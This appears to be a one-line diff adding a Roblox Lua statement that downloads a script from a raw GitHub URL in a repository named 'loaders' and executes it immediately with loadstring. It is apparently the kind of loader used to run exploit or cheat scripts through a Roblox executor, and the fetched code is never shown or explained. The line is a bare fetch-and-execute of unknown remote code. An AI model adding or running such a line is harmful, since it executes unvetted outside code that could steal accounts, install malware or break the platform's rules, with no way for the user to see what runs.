@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/hide-in-pixels-spam0-ihypw44shg6u9j.lua"))()
